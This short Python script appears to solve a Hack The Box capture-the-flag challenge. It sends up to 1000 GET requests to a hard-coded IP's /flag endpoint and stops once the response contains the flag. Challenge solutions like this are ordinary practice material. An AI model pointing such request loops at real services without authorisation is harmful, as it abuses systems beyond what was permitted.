import requests

url = 'http://159.65.81.51:31391/flag'

for i in range(0, 1000):
    req = requests.get(url=url)
    data = req.text
    print(f'[{i}]-', data)

    if 'HTB{' in req.text:
        flag = req.text
        break

print('flag ->', flag)
